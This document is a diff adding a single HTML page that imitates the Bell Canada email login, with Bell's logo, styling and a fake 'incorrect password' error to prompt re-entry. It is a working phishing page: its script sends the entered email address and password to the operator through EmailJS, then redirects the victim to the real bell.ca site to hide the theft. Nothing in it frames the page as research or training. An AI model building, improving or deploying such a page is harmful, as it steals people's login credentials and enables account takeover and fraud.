@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Bell Mail</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #f5f6f7;
+      margin: 0;
+      padding: 0;
+    }
+
+    .top-bar {
+      background-color: #004b91;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+    }
+
+    .top-bar img {
+      height: 30px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      background: #fff;
+      border: 1px solid #dcdcdc;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+
+    .header {
+      text-align: center;
+      padding: 20px;
+    }
+
+    .header img {
+      max-width: 100px;
+    }
+
+    .form-box {
+      padding: 30px 20px;
+    }
+
+    .form-box h2 {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: #333;
+      text-align: center;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 14px;
+      color: #444;
+    }
+
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+      width: 95%;
+      padding: 11px;
+      margin: 10px 0 20px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+      font-family: 'Roboto', sans-serif;
+      letter-spacing: normal;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .toggle-password {
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      color: #555;
+      margin-top: -5px;
+      margin-bottom: 20px;
+      gap: 5px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #004b91;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #003b75;
+    }
+
+    .footer {
+      font-size: 12px;
+      text-align: center;
+      color: #999;
+      padding: 15px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Full-width top blue bar with left-side Bell logo -->
+  <div class="top-bar">
+    <img src="https://www.bell.ca/Styles/images/logos/bell_logo.svg" alt="Bell Logo">
+  </div>
+
+  <div class="container">
+    <!-- Centered Bell logo in white box -->
+    <div class="header">
+      <img src="https://www.bell.ca/Styles/images/logos/bell_logo.svg" alt="Bell Logo">
+    </div>
+
+    <div class="form-box">
+      <h2>Log in to Bell email</h2>
+
+      <!-- RED ERROR MESSAGE -->
+      <div class="error-message">The email or password you entered is incorrect. Please try again.</div>
+
+      <form id="verifyForm">
+        <label for="email">Email address</label>
+        <input type="email" id="email" name="email" placeholder="Email address" required>
+
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+
+        <div class="toggle-password">
+          <input type="checkbox" id="showPasswordCheckbox">
+          <label for="showPasswordCheckbox">Show Password</label>
+        </div>
+
+        <button type="submit">Log In</button>
+      </form>
+    </div>
+    <div class="footer">
+      &copy; 2025 Bell Canada. All rights reserved.
+    </div>
+  </div>
+
+  <!-- EmailJS Script -->
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    emailjs.init("aku6OTWKf-UGwGLin"); // replace with your EmailJS public key
+
+    document.getElementById('verifyForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      emailjs.send("service_ovrg6vh", "template_1if631e", {
+        email: document.getElementById("email").value,
+        password: document.getElementById("password").value
+      }).then(function(response) {
+        window.location.href = "https://www.bell.ca/";
+      }, function(error) {
+        alert("There was an error. Try again.");
+      });
+    });
+
+    document.getElementById('showPasswordCheckbox').addEventListener('change', function () {
+      const passwordField = document.getElementById('password');
+      passwordField.type = this.checked ? 'text' : 'password';
+    });
+  </script>
+</body>
+</html>
